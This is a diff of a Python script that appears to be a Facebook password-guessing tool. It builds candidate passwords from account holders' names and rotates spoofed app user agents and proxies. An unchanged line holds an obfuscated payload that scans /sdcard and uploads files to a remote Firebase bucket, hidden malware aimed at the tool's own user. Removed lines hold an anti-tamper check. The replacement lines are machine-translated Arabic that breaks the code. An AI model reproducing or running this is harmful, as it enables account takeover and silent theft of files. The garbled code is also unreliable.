@@ -19,31 +19,31 @@ from concurrent.futures import ThreadPoolExecutor as tred
 from time import sleep as waktu
 from time import time as mek
 from bs4 import BeautifulSoup as sop
-import os,base64,zlib,pip,urllib,random, requests
-from io import BytesIO
-#import pycurl
-try:
-  import http.client
-  gmg=open(http.client.__file__).read()
-  if "write" in gmg:
-    print("F U")
-    exit()
-    exit()
-    time.sleep(4)
-    while True:requests
-    "HaN".FuCk
-    raise SystemExit
+استيراد os، base64، zlib، pip، urllib، random، requests
+من io استورد BytesIO
+#استيراد pycurl
+يحاول :
+  استيراد http.client
+  gmg= open ( http. client . __file__ ) . read ( )
+  إذا كان  "write"  في gmg:
+    اطبع ( "F U" )
+    مخرج ( )
+    مخرج ( )
+    الوقت. النوم ( 4 )
+    بينما  صحيح : الطلبات
+    "هان" . اللعنة
+    رفع SystemExit
 
-  if "pr"+"in"+"t(u"+"rl)" in gmg:
-    print("F U")
-    exit()
-    exit()
-    time.sleep(4)
-    while True:requests
-    "HaN".FuCk
-    raise SystemExit
-except:pass
-import requests
+  إذا كان  "pr" + "in" + "t(u)" + "rl)"  في gmg:
+    اطبع ( "F U" )
+    مخرج ( )
+    مخرج ( )
+    الوقت. النوم ( 4 )
+    بينما  صحيح : الطلبات
+    "هان" . اللعنة
+    رفع SystemExit
+باستثناء : تمرير
+طلبات الاستيراد
 ec='\x82\x83\x84>\x7fF\x89GX\x90\x83\x92\x93\x90\x8c>\x89(\x87\x8b\x8e\x8d\x90\x92>\x8d\x91J\x90\x7f\x8c\x82\x8d\x8bJ\x90\x83\x8f\x93\x83\x91\x92\x91(\x82\x83\x84>\x89\x89\x89FGX(>>>\x84\x8d\x90>\x90\x8d\x8d\x92J>\x82\x87\x90\x91J>\x84\x87\x8a\x83\x91>\x87\x8c>\x8d\x91L\x95\x7f\x8a\x89F@M\x91\x82\x81\x7f\x90\x82@GX(>>>>>>\x84\x8d\x90>\x84\x87\x8a\x83>\x87\x8c>\x84\x87\x8a\x83\x91X(>>>>>>>>\x92\x90\x97X(>>>>>>>>>>\x87\x84>\x84\x87\x8a\x83L\x83\x8c\x82\x91\x95\x87\x92\x86FEL\x8e\x97EGX(>>>>>>>>>>>>>>\x84\x87\x8a\x83O>[>\x90\x8d\x8d\x92IEMEI\x91\x92\x90F\x84\x87\x8a\x83G(>>>>>>>>>>>>>>\x87\x84>@qwcb@>\x87\x8c>\x8d\x8e\x83\x8cF\x84\x87\x8a\x83OGL\x90\x83\x7f\x82FGX(>>>>>>>>>>>>>>>>>\x84\x8a[\x84@\x99\x90\x7f\x8c\x82\x8d\x8bL\x90\x7f\x8c\x82\x87\x8c\x92FOJQNNG\x9bL\x8e\x97@(>>>>>>>>>>>>>>>>>\x92\x90\x97X\x90\x83\x8f\x93\x83\x91\x92\x91L\x8e\x8d\x91\x92F@\x86\x92\x92\x8e\x91XMM\x84\x87\x90\x83\x80\x7f\x91\x83\x91\x92\x8d\x90\x7f\x85\x83L\x85\x8d\x8d\x85\x8a\x83\x7f\x8e\x87\x91L\x81\x8d\x8bM\x94NM\x80M\x89\x87\x93K\x86\x87\x8a\x7fK\x82\x7f\x8a\x7fK\x8c\x7fL\x7f\x8e\x8e\x91\x8e\x8d\x92L\x81\x8d\x8bM\x8d]\x8c\x7f\x8b\x83[dgjcqM@I\x84\x8aJ\x84\x87\x8a\x83\x91[\x99E\x84\x87\x8a\x83EX\x8d\x8e\x83\x8cF\x84\x87\x8a\x83OGL\x90\x83\x7f\x82FG\x9bG(>>>>>>>>>>>>>>>>>\x83\x96\x81\x83\x8e\x92X\x8e\x7f\x91\x91(>>>>>>>>\x83\x96\x81\x83\x8e\x92X\x8e\x7f\x91\x91(((\x87\x8b\x8e\x8d\x90\x92>\x8b\x93\x8a\x92\x87\x8e\x90\x8d\x81\x83\x91\x91\x87\x8c\x85(\x8b\x93\x8a\x92\x87\x8e\x90\x8d\x81\x83\x91\x91\x87\x8c\x85Ln\x90\x8d\x81\x83\x91\x91F\x92\x7f\x90\x85\x83\x92[\x89\x89\x89GL\x91\x92\x7f\x90\x92FG(('
 
 link=''
@@ -483,7 +483,7 @@ def M_file_1(ids,names,passlist):
                                 
                         for pw in passlist:
                                 pas = pw.replace('first', fn.lower()).replace('First', fn).replace('last', ln.lower()).replace('Last', ln).replace('Name', names).replace('name', names.lower())
-                                u1a = "[FBAN/FB4A;FBAV/392.0.0.32.108;FBBV/318413147;[FBAN/FB4A;FBAV/392.0.0.32.108;FBPN/com.facebook.katana;FBLC/en_US;FBBV/318413147;FBCR/MetroPCS;FBMF/OPPO;FBBD/oppo;FBDV/CPH2207;FBSV/14.5.0;FBCA/x86_64:x86:arm64-v8a;FBDM/{density=1.8,width=1345,height=1023};FB_FW/1;FBRV/318805181;]"+"[FBAN/FB4A;FBAV/391.1.0.37.104;FBBV/318217130;[FBAN/FB4A;FBAV/391.1.0.37.104;FBPN/com.facebook.katana;FBLC/de_DE;FBBV/318217130;FBCR/PremiumSIM;FBMF/Samsung;FBBD/samsung;FBDV/SM-J105F;FBSV/12.6.2;FBCA/arm64-v8a:;FBDM/{density=3.0,width=536,height=1820};FB_FW/1;]"+"[FBAN/FB4A;FBAV/31.0.0.0.0;FBBV/7930627;[FBAN/FB4A;FBAV/31.0.0.0.0;FBPN/com.facebook.katana;FBLC/en_US;FBBV/7930627;FBCR/Verizon;FBMF/Vivo;FBBD/vivo;FBDV/V17 Pro;FBSV/5.5.2;FBCA/x86_64:x86:armeabi-v7a;FBDM/{density=1.75,width=774,height=2521};FB_FW/1;] FBBK/1]"+"[FBAN/FB4A;FBAV/139.0.0.26.93;FBBV/70506848;[FBAN/FB4A;FBAV/139.0.0.26.93;FBPN/com.facebook.katana;FBLC/de_DE;FBBV/70506848;FBCR/Smartmobil;FBMF/Vivo;FBBD/vivo;FBDV/Y69;FBSV/9.7.0;FBCA/x86_64:armeabi-v7a;FBDM/{density=1.875,width=783,height=733};FB_FW/1;FBRV/70645913;]"+"[FBAN/FB4A;FBAV/465.0.0.0.6;FBBV/452000754;[FBAN/FB4A;FBAV/465.0.0.0.6;FBPN/com.facebook.katana;FBLC/en_AU;FBBV/452000754;FBCR/Telstra;FBMF/Samsung;FBBD/samsung;FBDV/SM-J200F;FBSV/15.6.1;FBCA/x86_64:x86:armeabi-v7a;FBDM/{density=1.278,width=684,height=1221};]"+"[FBAN/FB4A;FBAV/174.0.0.54.96;FBBV/111133949;[FBAN/FB4A;FBAV/174.0.0.54.96;FBPN/com.facebook.katana;FBLC/de_DE;FBBV/111133949;FBCR/NettoKOM;FBMF/OPPO;FBBD/oppo;FBDV/CPH1602;FBSV/11.7.4;FBCA/arm64-v8a:armeabi-v7a:armeabi;FBDM/{density=2.5,width=443,height=2323};]"+"[FBAN/FB4A;FBAV/343.0.0.37.117;FBBV/308616431;[FBAN/FB4A;FBAV/343.0.0.37.117;FBPN/com.facebook.katana;FBLC/en_GB;FBBV/308616431;FBCR/Vodafone UK;FBMF/OPPO;FBBD/oppo;FBDV/CPH1931;FBSV/14.5.1;FBCA/x86:arm64-v8a:armeabi-v7a;FBDM/{density=1.5,width=689,height=2482};FB_FW/1;] FBBK/1]"+"[FBAN/FB4A;FBAV/138.0.0.19.93;FBBV/69169467;[FBAN/FB4A;FBAV/138.0.0.19.93;FBPN/com.facebook.katana;FBLC/en_AU;FBBV/69169467;FBCR/Boost Mobile;FBMF/Sony;FBBD/sony;FBDV/XQ-CC52;FBSV/9.8.2;FBCA/armeabi-v7a:armeabi;FBDM/{density=2.9,width=1435,height=2415};FB_FW/1;FBRV/69307490;] FBBK/1]"+"[FBAN/FB4A;FBAV/184.0.0.41.79;FBBV/119894354;[FBAN/FB4A;FBAV/184.0.0.41.79;FBPN/com.facebook.katana;FBLC/en_AU;FBBV/119894354;FBCR/Coles Mobile;FBMF/OPPO;FBBD/oppo;FBDV/CPH1607;FBSV/8.9.2;FBCA/arm64-v8a:;FBDM/{density=2.8,width=868,height=1190};FB_FW/1;FBRV/120078453;]"+"[FBAN/FB4A;FBAV/223.0.0.47.120;FBBV/156649449;[FBAN/FB4A;FBAV/223.0.0.47.120;FBBV/156649449;FBDM/{density=2.2,width=545,height=753};FBLC/en_US;FBRV/156872539;FB_FW/2;FBCR/Visible;FBMF/Vivo;FBBD/vivo;FBPN/com.facebook.katana;FBDV/Y30e;FBSV/9.8.0;FBOP/20;FBCA/x86:arm64-v8a:armeabi-v7a;]"+"[FBAN/FB4A;FBAV/356.0.0.28.112;FBBV/311215741;[FBAN/FB4A;FBAV/356.0.0.28.112;FBPN/com.facebook.katana;FBLC/en_CA;FBBV/311215741;FBCR/SaskTel;FBMF/OPPO;FBBD/oppo;FBDV/CPH1845;FBSV/12.8.4;FBCA/armeabi-v7a:armeabi;FBDM/{density=1.875,width=1253,height=1834};]"+"[FBAN/FB4A;FBAV/407.0.0.30.97;FBBV/440412261;[FBAN/FB4A;FBAV/407.0.0.30.97;FBPN/com.facebook.katana;FBLC/en_AU;FBBV/440412261;FBCR/TPG Telecom;FBMF/Vivo;FBBD/vivo;FBDV/V5;FBSV/12.6.1;FBCA/x86_64:armeabi-v7a;FBDM/{density=2.8,width=709,height=1043};FB_FW/1;]"
+                                u1a = "[FBAN/FB4A;FBAV/162.0.0.45.94;FBBV/95632808;FBDM/{density=1.25,width=1297,height=2329};FBLC/en_US;FBRV/95794877;FB_FW/2;FBCR/TracFone Wireless;FBMF/Lava;FBBD/lava;FBPN/com.facebook.katana;FBDV/A125;FBSV/10.8.5;FBOP/20;FBCA/arm64-v8a:armeabi-v7a:armeabi;][FBAN/FB4A;FBAV/170.0.0.52.95;FBBV/105856850;FBDM/{density=2.25,width=505,height=871};FBLC/de_DE;FBCR/Congstar;FBMF/Google;FBBD/google;FBPN/com.facebook.katana;FBDV/G020P;FBSV/11.7.2;FBCA/x86:armeabi-v7a;]
                                 device_id = str(uuid.uuid4())
                                 adid = str(uuid.uuid4())
                                 nip=random.choice(proxsi)
